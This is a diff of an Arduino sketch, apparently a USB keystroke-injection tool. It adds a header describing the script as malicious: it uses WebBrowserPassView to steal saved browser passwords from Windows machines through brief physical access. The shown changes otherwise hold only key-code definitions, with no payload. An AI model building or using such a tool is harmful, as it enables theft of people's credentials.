@@ -1,3 +1,20 @@
+/*
+
+    TITLE: webbrowser.ino
+    AUTHOR: Alan @ex0dus-0x
+    TARGET-OS: Windows XP, Windows 7, Windows 8.x, Windows 10
+    DEPENDENCIES: WebBrowserPassView.exe (stored in deps)
+    DESCRIPTION:
+      webbrowser.ino is a malicious script that obtains the WebBrowserPassView
+      to "recover" browser clearview passwords in a Window environment. This is
+      a quick and efficient hack, as it allows the attacker to steal credentials
+      just through quick physical access.
+
+
+*/
+
+
+
 #define LEFT_CTRL   0x01
 #define LEFT_SHIFT  0x02
 #define LEFT_ALT    0x04
@@ -6,7 +23,6 @@
 #define RIGHT_SHIFT 0x20
 #define RIGHT_ALT   0x40
 #define RIGHT_GUI   0x80
-
 
 //Keys
 #define KEY_ENTER 0x28
